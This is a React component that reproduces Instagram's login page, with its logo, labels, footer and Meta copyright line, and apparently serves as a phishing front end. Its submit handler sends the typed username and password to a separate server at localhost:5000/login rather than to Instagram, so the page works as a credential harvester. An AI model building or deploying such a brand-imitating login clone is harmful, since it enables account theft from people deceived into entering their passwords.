import React, { useState } from "react";
import instagramLogo from "./img/instagram-logo.png";
import googlePlayButton from "./img/googleplay-button.png";
import microsoftLogo from "./img/Microsoft.png";
import "./styles.css";
import axios from "axios";

const Instagram = () => {
  const [username, setusername] = useState("");
  const [password, setpassword] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    const body = { username: username, password: password };
    axios.post("http://localhost:5000/login", body);
  };
  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    if (name == "username") {
      setusername(value);
    } else if (name == "password") {
      setpassword(value);
    }
  };
  return (
    <div>
      <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex"></section>
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              <img
                src={instagramLogo}
                alt="Instagram logo"
                title="Instagram logo"
              />
            </h1>
            <form onSubmit={(e) => handleSubmit(e)}>
              <label htmlFor="username" className="sr-only">
                Phone number, username, or e-mail
              </label>
              <input
                onChange={(e) => handleChange(e)}
                name="username"
                placeholder="Phone number, username, or e-mail"
              />
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                onChange={(e) => handleChange(e)}
                name="password"
                type="password"
                placeholder="password"
              />
              <button type="submit">Log in</button>
            </form>
            <div className="flex separator align-items-center">
              <span></span>
              <div className="or">OR</div>
              <span></span>
            </div>
            <div className="login-with-fb flex direction-column align-items-center">
              <div>
                <a href="#" class="fa fa-facebook">
                  Log in with Facebook
                </a>
              </div>
              <a href="#">Forgot password?</a>
            </div>
          </div>
          <div className="panel register flex justify-content-center">
            <p>Don't have an account?</p>
            <a href="#">Signup</a>
          </div>
          <div className="app-download flex direction-column align-items-center">
            <p>Get the app.</p>
            <div className="flex justify-content-center">
              <img
                src={googlePlayButton}
                alt="Imagem com a logo da Google Play"
                title="Imagem com a logo da Google Play"
              />
              <img
                alt="Get it from Microsoft"
                className="_aa5q"
                src={microsoftLogo}
              />
            </div>
          </div>
        </section>
      </main>
      <footer>
        <ul className="flex flex-wrap justify-content-center">
          <li>
            <a href="#">Meta</a>
          </li>
          <li>
            <a href="#">About</a>
          </li>
          <li>
            <a href="#">Blog</a>
          </li>
          <li>
            <a href="#">Jobs</a>
          </li>
          <li>
            <a href="#">Help</a>
          </li>
          <li>
            <a href="#">API</a>
          </li>
          <li>
            <a href="#">Privacy</a>
          </li>
          <li>
            <a href="#">Terms</a>
          </li>
          <li>
            <a href="#">Top Accounts</a>
          </li>
          <li>
            <a href="#">Locations</a>
          </li>
          <li>
            <a href="#">Instagram Lite</a>
          </li>
          <li>
            <a href="#">Contact Uploading &amp; Non-Users</a>
          </li>
          <li>
            <a href="#">Meta Verified</a>
          </li>
        </ul>
        <p className="copyright">© 2023 Instagram from Meta</p>
      </footer>
    </div>
  );
};

export default Instagram;
